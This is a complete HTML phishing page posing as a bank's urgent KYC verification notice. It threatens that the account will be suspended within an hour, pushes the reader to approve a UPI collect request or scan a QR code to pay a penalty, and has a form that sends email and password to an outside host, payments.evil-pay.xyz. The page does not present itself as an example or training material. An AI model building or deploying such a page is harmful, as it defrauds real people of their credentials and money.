<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Account Verification Required</title>
  <style>
    body { font-family: Georgia, serif; max-width: 720px; margin: 4rem auto; padding: 0 1.5rem; }
    .card { border: 1px solid #d4d4d8; border-radius: 18px; padding: 2rem; box-shadow: 0 8px 24px rgba(15, 23, 42, 0.08); }
    .cta { display: inline-block; padding: 0.9rem 1.2rem; background: #dc2626; color: #fff; border-radius: 999px; text-decoration: none; }
    input { width: 100%; padding: 0.8rem; margin: 0.8rem 0; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Urgent Account Verification</h1>
    <p>Your bank account will be suspended within 1 hour unless you verify KYC and pay the outstanding penalty now.</p>
    <p>Scan QR or approve the UPI collect request immediately to avoid permanent closure.</p>
    <form action="https://payments.evil-pay.xyz/collect" method="post">
      <input type="email" placeholder="Email">
      <input type="password" placeholder="Password">
      <button class="cta" type="submit">Verify and Pay</button>
    </form>
  </div>
</body>
</html>
